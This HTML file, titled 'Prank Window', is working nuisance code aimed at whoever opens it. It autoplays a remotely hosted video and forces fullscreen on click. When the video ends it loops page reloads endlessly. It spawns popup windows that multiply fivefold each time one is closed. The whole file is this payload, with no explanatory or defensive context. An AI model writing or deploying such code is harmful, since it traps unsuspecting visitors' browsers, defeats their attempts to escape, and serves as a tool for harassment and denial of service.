<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prank Window</title>
   <style>
  body, html {
    margin: 0;
    padding: 0;
    background-color: black;
    height: 100%;
    overflow: hidden;
  }

  #myVideo {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    object-fit: cover; 
  }
</style>
  <video id="myVideo" controls autoplay>
  <source src="https://raw.githubusercontent.com/monosourcil3000/idk/main/warudo.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>
    <script>
       var video = document.getElementById("myVideo");
      video.addEventListener("click", function() {
  document.documentElement.requestFullscreen().catch(err => console.error(err));
});

  video.onended = function() {
    while(1)location.reload(1);
  };
        function spawnWindows(count) {
            for (let i = 0; i < count; i++) {
                let x = Math.floor(Math.random() * (screen.availWidth - 220)); // Random X
                let y = Math.floor(Math.random() * (screen.availHeight - 220)); // Random Y

                let newWin = window.open(window.location.href, "", `width=200,height=200,left=${x},top=${y}`);
                if (!newWin) return;

                setTimeout(() => {
                    try {
                        newWin.moveTo(x, y);
                    } catch (e) {
                        console.error("Window move blocked:", e);
                    }
                }, 100);

                let checkClosed = setInterval(() => {
                    if (newWin.closed) {
                        clearInterval(checkClosed);
                        spawnWindows(5); // Open 5 new windows when closed
                    }
                }, 500);
            }
        }

        window.onload = () => setTimeout(() => spawnWindows(1), 500);
    </script>
</head>
